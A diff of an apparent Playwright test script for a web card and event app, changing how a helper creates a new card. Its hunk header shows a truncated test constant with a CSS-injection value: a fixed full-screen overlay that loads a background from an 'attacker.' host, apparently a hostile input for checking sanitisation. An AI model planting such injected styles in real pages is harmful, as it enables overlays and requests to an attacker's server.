@@ -86,7 +86,7 @@ const XC='red;position:fixed;inset:0;z-index:99;background:url(https://attacker.
   const liveTop=p=>p.evaluate(()=>{if(curSec!=="live")setSection("live",{instant:true});lvOpen=null;dnOpen=null;render()}).then(()=>p.waitForTimeout(400));
   /* 新卡片：浮動圓鈕＝一張空白卡片、游標在名稱 → 打名稱、點外面存檔 */
   const newCard=async(p,name)=>{
-    await liveTop(p);await p.click('#addEvent');await p.waitForSelector('.lc-ed [data-kptitle]');await p.fill('.lc-ed [data-kptitle]',name);await outside(p);
+    await liveTop(p);await (async()=>{await p.click('#addEvent');await p.waitForTimeout(350);await p.click('[data-fabadd="text"]')})();await p.waitForSelector('.lc-ed [data-kptitle]');await p.fill('.lc-ed [data-kptitle]',name);await outside(p);
     const id=await p.evaluate(n=>(state.events.find(e=>e.name===n)||{}).id,name);await show(p,id);return id};
   /* 時間頁：選一段再用方向鍵、數字調整 */
   const teSet=async(p,tid,{d,h,m,eh,em})=>{const T=`.lc-ed .te[data-te="${tid}"]`;
